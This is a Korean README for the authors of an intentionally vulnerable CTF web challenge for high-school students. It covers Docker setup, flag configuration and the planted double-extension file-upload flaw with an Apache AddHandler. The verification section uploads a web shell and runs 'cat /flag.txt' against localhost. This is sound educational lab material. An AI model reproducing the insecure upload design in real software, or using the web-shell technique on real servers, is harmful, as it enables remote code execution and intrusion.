# 🎄 X-mas Album — 출제자용 README

고등학생 대상 CTF용 **의도적으로 취약한** 파일 업로드 웹 챌린지입니다.
통제된 CTF 환경에 배포하는 **교육용 취약 타겟**입니다.

- **카테고리**: Web
- **난이도**: Easy
- **취약점**: 파일 업로드 (느슨한 화이트리스트 + 더블 익스텐션 → `AddHandler` 로 PHP 실행)

> ⚠️ 이 애플리케이션은 **일부러 취약하게** 만들어졌습니다. 반드시 격리된 CTF 환경에서만 실행하세요.

---

## 🚀 빌드 & 실행

사전 요구사항: Docker + Docker Compose

```bash
cd album
docker compose up -d --build
```

- 접속: <http://localhost:8003>
- 포트 변경: `docker-compose.yml` 의 `ports` (`"8003:80"`) 에서 호스트 포트를 바꾸세요.

종료 / 정리:

```bash
docker compose down
```

---

## 🚩 플래그 변경

플래그는 컨테이너 시작 시 `entrypoint.sh` 가 `FLAG` 환경변수를 읽어
웹 루트 바깥인 `/flag.txt` 에 기록합니다. 웹에서는 직접 접근할 수 없고,
**웹쉘 RCE 로 명령을 실행해야만** 읽을 수 있습니다.

`docker-compose.yml` 에서 값을 바꾸면 됩니다:

```yaml
    environment:
      FLAG: "XMAS{여기에_원하는_플래그}"
```

변경 후 다시 띄우기:

```bash
docker compose up -d --force-recreate
```

형식: `XMAS{...}`

---

## 🧩 동작 개요

| 경로 | 설명 |
|------|------|
| `/index.php`   | 메인 + 업로드 폼 (jpg/png 안내) |
| `/upload.php`  | 업로드 처리 (★느슨한 확장자 검증) |
| `/gallery.php` | 업로드된 사진 썸네일 + 실제 경로 노출 |
| `/uploads/`    | 업로드 저장소 (웹 접근 + PHP 실행 가능) |
| `/flag.txt`    | 플래그 (웹 루트 바깥, RCE 로만 획득) |

---

## 🔧 취약점 설계 요약 (상세는 `solution.md`)

1. `upload.php` 가 `pathinfo(PATHINFO_EXTENSION)` 으로 **마지막 확장자만** 검사 → `shell.php.png` 통과.
2. `apache/xmas-album.conf` 의 `AddHandler application/x-httpd-php .php` 가
   파일명 **어디에든** `.php` 가 있으면 PHP 로 실행 → `shell.php.png` 실행됨.
3. 업로드 디렉토리가 웹 접근 + PHP 실행 가능 → 웹쉘 트리거.

소스 유출 방지(`.git`, `*.bak`, `*~`, `*.swp` 차단)는 적용했지만,
**의도된 취약점은 그대로 동작**합니다.

---

## ✅ 동작 검증 (요약)

```bash
# 1) 웹쉘 업로드
curl -s -F 'photo=@shell.php.png' http://localhost:8003/upload.php

# 2) RCE 로 플래그 읽기
curl -s 'http://localhost:8003/uploads/shell.php.png?cmd=cat%20/flag.txt'
# -> XMAS{...}
```

자세한 단계별 익스플로잇은 `solution.md` 참고.
